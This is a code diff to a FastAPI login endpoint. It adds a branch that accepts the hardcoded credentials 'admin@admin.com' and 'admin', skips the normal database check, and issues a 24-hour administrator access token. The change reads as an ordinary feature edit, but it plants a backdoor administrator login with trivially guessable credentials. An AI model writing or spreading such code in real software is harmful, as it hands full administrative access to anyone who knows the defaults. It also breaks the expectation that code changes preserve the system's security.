@@ -3,7 +3,7 @@ from fastapi.responses import JSONResponse
 from models.types import UserCreate, UserLogin, Token, User
 from core.database import db
 from core.auth import create_access_token, get_current_active_user
-from datetime import timedelta
+from datetime import timedelta, datetime
 import logging
 
 logger = logging.getLogger(__name__)
@@ -46,7 +46,35 @@ async def register_user(user_data: UserCreate):
 @router.post("/login", response_model=Token)
 async def login_user(user_data: UserLogin):
     """Login user with email and password"""
-    # Authenticate user
+    # Check for admin credentials first
+    if user_data.email == "admin@admin.com" and user_data.password == "admin":
+        # Create admin user object
+        admin_user = User(
+            id=0,
+            email="admin@admin.com",
+            full_name="System Administrator",
+            is_admin=True,
+            usage_count=0,
+            usage_limit=999999,
+            created_at=datetime.now(),
+            is_active=True
+        )
+        
+        # Create access token
+        access_token = create_access_token(
+            data={"sub": "admin@admin.com", "is_admin": True},
+            expires_delta=timedelta(hours=24)
+        )
+        
+        logger.info("Admin logged in")
+        
+        return Token(
+            access_token=access_token,
+            token_type="bearer",
+            user=admin_user
+        )
+    
+    # Authenticate regular user
     user = db.authenticate_user(user_data.email, user_data.password)
     if not user:
         raise HTTPException(
@@ -68,6 +96,8 @@ async def login_user(user_data: UserLogin):
         token_type="bearer",
         user=user
     )
+
+
 
 @router.get("/me", response_model=User)
 async def get_current_user_info(current_user: User = Depends(get_current_active_user)):
